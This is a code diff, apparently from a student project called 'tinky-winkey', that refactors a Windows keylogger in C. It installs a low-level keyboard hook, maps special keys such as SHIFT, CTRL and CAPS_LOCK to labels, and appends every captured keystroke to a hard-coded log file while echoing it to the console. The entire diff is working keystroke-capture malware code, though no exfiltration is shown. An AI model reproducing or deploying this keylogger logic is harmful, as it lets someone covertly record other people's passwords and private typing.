@@ -14,6 +14,38 @@ BOOL capsLockActivated = FALSE;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
  
+ char* handleSpecialCase(DWORD vkCode)
+ {
+    switch (vkCode)
+    {
+        case VK_ESCAPE:
+            return "ESC";
+        case VK_RETURN:
+            return "RETURN";
+        case VK_TAB:
+            return "TAB";
+        case VK_CONTROL:
+        case VK_LCONTROL:
+        case VK_RCONTROL:
+            return "CTRL";
+        case VK_MENU:
+        case VK_LMENU:
+        case VK_RMENU:
+            return "ALT";
+        case VK_SHIFT:
+        case VK_LSHIFT:
+        case VK_RSHIFT:
+            shiftIsHeld = TRUE;
+            return "SHIFT";
+        case VK_CAPITAL:
+            capsLockActivated = !capsLockActivated;
+            return "CAPS_LOCK";
+        case VK_BACK:
+            return "BACK";
+    }
+    return NULL;
+ }
+
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
@@ -36,41 +68,9 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
             // Special cases
-            switch (kbdStruct.vkCode)
+            char* specialCase = handleSpecialCase(kbdStruct.vkCode);
+            if (specialCase == NULL)
             {
-            case VK_ESCAPE:
-                strcpy_s(keyString, sizeof keyString, "ESC");
-                break;
-            case VK_RETURN:
-                strcpy_s(keyString, sizeof keyString, "RETURN");
-                break;
-            case VK_TAB:
-                strcpy_s(keyString, sizeof keyString, "TAB");
-                break;
-            case VK_CONTROL:
-            case VK_LCONTROL:
-            case VK_RCONTROL:
-                strcpy_s(keyString, sizeof keyString, "CTRL");
-                break;
-            case VK_MENU:
-            case VK_LMENU:
-            case VK_RMENU:
-                strcpy_s(keyString, sizeof keyString, "ALT");
-                break;
-            case VK_SHIFT:
-            case VK_LSHIFT:
-            case VK_RSHIFT:
-                strcpy_s(keyString, sizeof keyString, "SHIFT");
-                shiftIsHeld = TRUE;
-                break;
-            case VK_CAPITAL:
-                strcpy_s(keyString, sizeof keyString, "CAPS_LOCK");
-                capsLockActivated = !capsLockActivated;
-                break;
-            case VK_BACK:
-                strcpy_s(keyString, sizeof keyString, "BACK");
-                break;
-            default:
                 char c = kbdStruct.vkCode;
                 BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
                 if (!useUpperCase)
@@ -79,9 +79,13 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 }
                 keyString[0] = c;
                 keyString[1] = '\0';
-                break;
+            }
+            else
+            {
+                strcpy_s(keyString, sizeof keyString, specialCase);
             }
 
+            printf("%s", keyString);
             dwBytesToWrite = strlen(keyString);
             dwBytesWritten = 0;
             bErrorFlag = WriteFile( 
@@ -124,10 +128,11 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
  
-void main(int argc, TCHAR *argv[])
+void main()
 {
+    char filename[] = "c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\logs.txt";
     // Try to create file
-    hFile = CreateFile("testHooks.txt",      
+    hFile = CreateFile(filename,      
                        GENERIC_WRITE,        
                        0,                   
                        NULL,               
@@ -135,10 +140,10 @@ void main(int argc, TCHAR *argv[])
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);
 
-    // If we could not try to edit it
+    // If creation failed try to edit it
     if (hFile == INVALID_HANDLE_VALUE) 
     { 
-        hFile = CreateFile("testHooks.txt",
+        hFile = CreateFile(filename,
                            FILE_APPEND_DATA,
                            0,              
                            NULL,          
@@ -147,14 +152,12 @@ void main(int argc, TCHAR *argv[])
                            NULL);               
     }
 
-    // #### creating file #### 
+    // Infinite loop listening for messages
     SetHook();
- 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
-
 
     CloseHandle(hFile);
 }
